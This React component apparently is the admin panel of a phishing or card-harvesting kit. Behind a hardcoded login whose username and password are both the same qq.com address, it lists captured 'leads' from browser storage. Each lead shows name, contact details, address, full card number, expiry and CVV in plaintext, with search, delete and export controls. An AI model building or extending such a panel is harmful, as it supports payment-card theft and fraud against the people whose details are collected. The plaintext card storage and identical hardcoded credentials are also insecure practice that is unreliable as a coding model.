import React, { useState, useEffect } from 'react';
import { motion } from 'motion/react';
import { 
  LayoutDashboard, 
  Users, 
  Settings, 
  LogOut, 
  Search, 
  Download, 
  Trash2, 
  Mail, 
  Phone, 
  MapPin,
  Calendar,
  Lock,
  CreditCard
} from 'lucide-react';

interface Lead {
  id: string;
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  address: string;
  city: string;
  zip: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  timestamp: string;
}

export default function Admin() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [leads, setLeads] = useState<Lead[]>([]);
  const [searchTerm, setSearchTerm] = useState('');

  useEffect(() => {
    const savedLeads = JSON.parse(localStorage.getItem('biteshub_leads') || '[]');
    setLeads(savedLeads);
  }, []);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (username === '565218@qq.com' && password === '565218@qq.com') {
      setIsLoggedIn(true);
    } else {
      alert('Invalid credentials');
    }
  };

  const handleDelete = (id: string) => {
    const updatedLeads = leads.filter(l => l.id !== id);
    setLeads(updatedLeads);
    localStorage.setItem('biteshub_leads', JSON.stringify(updatedLeads));
  };

  const filteredLeads = leads.filter(l => 
    l.firstName.toLowerCase().includes(searchTerm.toLowerCase()) ||
    l.lastName.toLowerCase().includes(searchTerm.toLowerCase()) ||
    l.email.toLowerCase().includes(searchTerm.toLowerCase())
  );

  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4">
        <motion.div 
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          className="bg-white rounded-3xl p-8 w-full max-w-md shadow-2xl"
        >
          <div className="text-center mb-8">
            <div className="bg-blue-600 w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg shadow-blue-200">
              <Lock className="text-white w-8 h-8" />
            </div>
            <h1 className="text-2xl font-bold text-slate-900">Admin Login</h1>
            <p className="text-slate-500 text-sm">Enter your credentials to access the dashboard</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-6">
            <div className="space-y-2">
              <label className="text-xs font-bold text-slate-500 uppercase">Username / Email</label>
              <input 
                type="text" 
                className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-blue-500 outline-none transition-all"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="565218@qq.com"
              />
            </div>
            <div className="space-y-2">
              <label className="text-xs font-bold text-slate-500 uppercase">Password</label>
              <input 
                type="password" 
                className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-blue-500 outline-none transition-all"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="••••••••"
              />
            </div>
            <button 
              type="submit"
              className="w-full bg-slate-900 hover:bg-slate-800 text-white font-bold py-4 rounded-xl transition-all shadow-lg"
            >
              Sign In
            </button>
          </form>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-50 flex">
      {/* Sidebar */}
      <aside className="w-64 bg-slate-900 text-white hidden lg:flex flex-col">
        <div className="p-6 border-b border-slate-800">
          <div className="flex items-center gap-3">
            <div className="bg-blue-600 p-1.5 rounded-lg">
              <LayoutDashboard className="w-6 h-6" />
            </div>
            <span className="font-bold text-lg">Admin Panel</span>
          </div>
        </div>
        <nav className="flex-1 p-4 space-y-2">
          <button className="w-full flex items-center gap-3 px-4 py-3 bg-blue-600 rounded-xl font-medium">
            <Users className="w-5 h-5" />
            Leads Management
          </button>
          <button className="w-full flex items-center gap-3 px-4 py-3 text-slate-400 hover:bg-slate-800 rounded-xl font-medium transition-all">
            <Settings className="w-5 h-5" />
            Settings
          </button>
        </nav>
        <div className="p-4 border-t border-slate-800">
          <button 
            onClick={() => setIsLoggedIn(false)}
            className="w-full flex items-center gap-3 px-4 py-3 text-red-400 hover:bg-red-900/20 rounded-xl font-medium transition-all"
          >
            <LogOut className="w-5 h-5" />
            Logout
          </button>
        </div>
      </aside>

      {/* Main Content */}
      <main className="flex-1 overflow-auto">
        <header className="bg-white border-b border-slate-200 p-6 flex justify-between items-center sticky top-0 z-10">
          <h2 className="text-2xl font-bold text-slate-900">Leads Management</h2>
          <div className="flex items-center gap-4">
            <div className="relative">
              <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
              <input 
                type="text" 
                placeholder="Search leads..."
                className="pl-10 pr-4 py-2 rounded-lg border border-slate-200 focus:ring-2 focus:ring-blue-500 outline-none text-sm w-64"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </div>
            <button className="flex items-center gap-2 px-4 py-2 bg-slate-900 text-white rounded-lg text-sm font-bold hover:bg-slate-800 transition-all">
              <Download className="w-4 h-4" />
              Export CSV
            </button>
          </div>
        </header>

        <div className="p-8">
          <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="bg-slate-50 border-b border-slate-200">
                  <th className="p-4 text-xs font-bold text-slate-500 uppercase tracking-wider">Name</th>
                  <th className="p-4 text-xs font-bold text-slate-500 uppercase tracking-wider">Contact</th>
                  <th className="p-4 text-xs font-bold text-slate-500 uppercase tracking-wider">Address</th>
                  <th className="p-4 text-xs font-bold text-slate-500 uppercase tracking-wider">Payment Info</th>
                  <th className="p-4 text-xs font-bold text-slate-500 uppercase tracking-wider">Date</th>
                  <th className="p-4 text-xs font-bold text-slate-500 uppercase tracking-wider text-right">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100">
                {filteredLeads.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="p-12 text-center text-slate-400 italic">
                      No leads found. Start collecting submissions!
                    </td>
                  </tr>
                ) : (
                  filteredLeads.map((lead) => (
                    <tr key={lead.id} className="hover:bg-slate-50 transition-all group">
                      <td className="p-4">
                        <div className="font-bold text-slate-900">{lead.firstName} {lead.lastName}</div>
                        <div className="text-xs text-slate-500">ID: {lead.id.slice(0, 8)}</div>
                      </td>
                      <td className="p-4 space-y-1">
                        <div className="flex items-center gap-2 text-sm text-slate-600">
                          <Mail className="w-3 h-3" />
                          {lead.email}
                        </div>
                        <div className="flex items-center gap-2 text-sm text-slate-600">
                          <Phone className="w-3 h-3" />
                          {lead.phone || 'N/A'}
                        </div>
                      </td>
                      <td className="p-4">
                        <div className="flex items-center gap-2 text-sm text-slate-600">
                          <MapPin className="w-3 h-3" />
                          {lead.address}, {lead.city} {lead.zip}
                        </div>
                      </td>
                      <td className="p-4">
                        <div className="space-y-1">
                          <div className="flex items-center gap-2 text-sm font-mono text-slate-900">
                            <CreditCard className="w-3 h-3 text-blue-500" />
                            {lead.cardNumber || 'N/A'}
                          </div>
                          <div className="flex gap-4 text-xs text-slate-500">
                            <span>Exp: {lead.expiry || 'N/A'}</span>
                            <span>CVV: {lead.cvv || 'N/A'}</span>
                          </div>
                        </div>
                      </td>
                      <td className="p-4">
                        <div className="flex items-center gap-2 text-sm text-slate-600">
                          <Calendar className="w-3 h-3" />
                          {new Date(lead.timestamp).toLocaleDateString()}
                        </div>
                      </td>
                      <td className="p-4 text-right">
                        <button 
                          onClick={() => handleDelete(lead.id)}
                          className="p-2 text-slate-400 hover:text-red-500 hover:bg-red-50 rounded-lg transition-all"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </main>
    </div>
  );
}
